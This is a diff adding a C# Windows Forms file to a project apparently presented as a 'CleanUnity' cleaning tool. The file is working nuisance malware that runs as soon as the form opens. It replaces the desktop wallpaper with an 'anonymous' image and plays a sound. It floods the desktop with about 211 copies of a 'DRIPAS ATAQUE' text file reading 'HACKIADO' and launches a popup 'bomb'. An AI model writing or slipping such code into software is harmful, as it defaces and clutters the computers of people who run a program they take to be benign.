@@ -1,0 +1,81 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Media;
+
+namespace cleanUnity
+{
+    public partial class main : Form
+    {
+        [DllImport("user32.dll")]
+        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
+        private void wallpaperChang()
+        {
+            UInt32 SPI_SETWALL = 0x14;
+            UInt32 SPIF_UPDATE = 0x01;
+            UInt32 SPIF_SWEWINI = 0x2;
+
+            string filePath;
+
+            filePath = @"C:\CleanUnity\assets\anonyInte.jpg";
+            SystemParametersInfo(SPI_SETWALL, 0, filePath, SPIF_UPDATE | SPIF_SWEWINI);
+        }
+
+        private void playSimpleSound()
+        {
+            SoundPlayer simpleSound = new SoundPlayer(@"C:\CleanUnity\assets\chaves.wav");
+            simpleSound.Play();
+        }
+
+        private void popupBomb()
+        {
+            popup j2 = new popup();
+            j2.Show();
+        }
+
+        private void createTXTdesktop()
+        {
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string Location = desktopPath;
+            string NomeDoArquivo = "DRIPAS ATAQUE.txt";
+            string file = System.IO.Path.Combine(Location, NomeDoArquivo);
+            if (!System.IO.File.Exists(file))
+            {
+                //System.IO.File.Create(file);
+                string texto = "HACKIADOKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk\nKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkkkkKKKKKKKKKKKKKKKKKKKKkk";
+                System.IO.File.AppendAllText(file, texto);
+                int count = 0;
+                string FileLocation = $@"{desktopPath}\DRIPAS ATAQUE.txt";
+                string pathCopy = $@"{desktopPath}\DRIPAS ATAQUE{count}.txt";
+                System.IO.File.Copy(FileLocation, pathCopy);
+                count++;
+                int Limite = 210;
+                while (count <= Limite)
+                {
+                    pathCopy = $@"{desktopPath}\DRIPAS ATAQUE{count}.txt";
+                    System.IO.File.Copy(FileLocation, pathCopy);
+                    count++;
+                }
+            }
+
+        }
+
+        public main()
+        {
+            InitializeComponent();
+            wallpaperChang();
+            playSimpleSound();
+            createTXTdesktop();
+            popupBomb();
+        }
+
+
+    }
+}
